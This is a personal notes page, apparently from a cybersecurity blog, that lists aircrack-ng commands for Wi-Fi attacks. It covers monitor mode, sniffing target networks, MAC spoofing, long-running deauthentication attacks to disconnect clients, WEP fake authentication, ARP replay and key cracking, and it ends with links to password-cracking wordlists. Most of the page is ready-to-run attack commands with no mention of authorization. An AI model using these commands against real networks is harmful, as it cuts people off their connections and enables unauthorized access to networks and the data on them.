---
title: 5. cyber attack commands (Network Attacks)
date: 2024-12-03
draft: 
Toc: true
tags:
  - cybersec
  - tips/tricks
---

---

*note: its my personal research so there can be errors or more fast and powerful method available to do same attacks*

---
## Commands Related to Network Attacks:

packet sniffing : airodump-ng [monitor mode interface]

*first enable monitor mode;  then..*

- `ifconfig wlan0 down`

- `airmon-ng check kill` ( to kill the manager)
 
- `iwconfig wlan0 mode monitor`

- `ifconfig wlan0 up`

- `iwconfig` ( to check)
 
 
---
## network preconnection attack.txt

*note: need monitor mode on*

 - `airodump-ng wlan0 ( discover all wireless network and info around it)`

*sniff and discover 5Ghz networks*

- `airodump-ng --band a wlan0`  (a = 5Ghz)

*for sniffing multiple bands ( 2.4 & 5)*

- `airodump-ng --band abg wlan0`  ( all frequency)

*to siff only target network **

- `airodump-ng  --bssid XX:XX:XX:XX:XX:XX --channel X --write test wlan0` 

{ *"channel" for airodump-ng to sniff on and "write" for storing data in file* (xxxx.cap)}

- `wireshark` ( *to lauch wireshark or can open manually to check the xxxx.cap file filled with target data*)

---
## change your mac adresss:

- `ifconfig wlan0 down` (to make wlan0 down)

- `ifconfig wlan0 hw ether XX:XX:XX:XX:XX:XX` ( *random mac address*)

- `ifconfig wlan0 up` (*to make wlan0 up again*)

- `ifconfig` ( *to check *)
``
---
## deauthentication attack ( disconnect any client form any network)

- `aireplay-ng --deauth [deauth Pacekts] -a [Network Mac add] -c [Target Mac add]  [Interface]`

 *run airodump-ng in parallel terminal against the target network*

- `airodump-ng  --bssid XX:XX:XX:XX:XX:XX --channel X wlan0` (*no need of --write if u dont want file*)

- `aireplay-ng --deauth 100000000 -a XX:XX:XX:XX:XX:XX -c XX:XX:XX:XX:XX:XX  -D wlan0`

{ *100000000 give max packets to deauth for long time; "-D" if client is on 5Ghz network 
and if its in 2.4Ghz then remove the "-D"*}

*if client still has access to other networks then split the terminal and run same attack parallel on that network*

---
## Fake authentication attack (wep)

*forcing AP to generate new packets with new IVs*

- `aireplay-ng --fakeauth 0 -a [network Mac add] -h[our Mac add] wlan0`

- `airodump-ng --bssid XX:XX:XX:XX:XX:XX --channel x --write xxxx wlan0`
(*sniffing target network with storing data and running parallely*)
 
- `aireplay-ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0`
(*0 for doing fake authentication attack once* )

*running arpreplay attack*

- `aireplay-ng --arpreplay -b XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0`

*associate data 1 more time*

- `aireplay-ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0`

- `aircrack-ng xxxx.cap`

----
## Gainning access (wep cracking)

*needs to capture large no. of packets
iv is too small(24 bits)
iv is sent in plain text*

*to capture large no. of packets/IVs*    --->   using airodump-ng
*to analyse the captured packets/IVs and crack the key* ----> using aircrack-ng

**step1:**
 *wireless adapter in monitor mode

- `airodump-ng wlan0` (  *discover all wireless network and info around it in parallel terminal*)

- `airodump-ng  --bssid XX:XX:XX:XX:XX:XX --channel X --write test wlan0`  
( *to capture packets of specefic target network and "--write" to sotred data in file*)

**step2:**

- `aircrack-ng xxxx.cap` (xxxx.cap = file name)

*will get key and ascii password, can connect through both and for key remove the colon*

---
## wpa/wpa2 cracking

*both can be cracked using the same methods

made to adress the issues in wep

much more secure

each packet is encrypted using a unique temporary key

packet contains no useful information*

---
## some-Links-To-wordlists

**Openwall Wordlists**  
Use: Offers a variety of password cracking wordlists for security testing and penetration testing.
ftp://ftp.openwall.com/pub/wordlists/

**Openwall Mirrors**  
Use: Mirror site for Openwall’s tools, providing easy access to its resources, including wordlists.
http://www.openwall.com/mirrors/

**SecLists on GitHub**  
Use: A collection of security-related wordlists for various penetration testing needs, like password cracking and directory brute forcing.
https://github.com/danielmiessler/SecLists

**Outpost9 Wordlists**  
Use: Provides password wordlists for cracking and penetration testing.
http://www.outpost9.com/files/WordLists.html

**Vulnerability Assessment Passwords**  
Use: Offers password wordlists for vulnerability assessments and security testing.
http://www.vulnerabilityassessment.co.uk/passwords.htm

**Packet Storm Wordlists**  
Use: A trusted resource offering various wordlists for security professionals, particularly for cracking passwords.
http://packetstormsecurity.org/Crackers/wordlists/

**Moby Wordlists**  
Use: Large collections of English wordlists used in password cracking and natural language processing tasks.
http://www.ai.uga.edu/ftplib/natural-language/moby/

**Cotse Wordlists 1**  
Use: Provides wordlists for security testing, including common passwords and user names.
http://www.cotse.com/tools/wordlists1.htm

**Cotse Wordlists 2**  
Use: Additional wordlists for password cracking and penetration testing.
http://www.cotse.com/tools/wordlists2.htm

**Wordlist Project**  
Use: A SourceForge project offering a variety of wordlists for password cracking and security testing.
http://wordlist.sourceforge.net/

---
[Crusveder]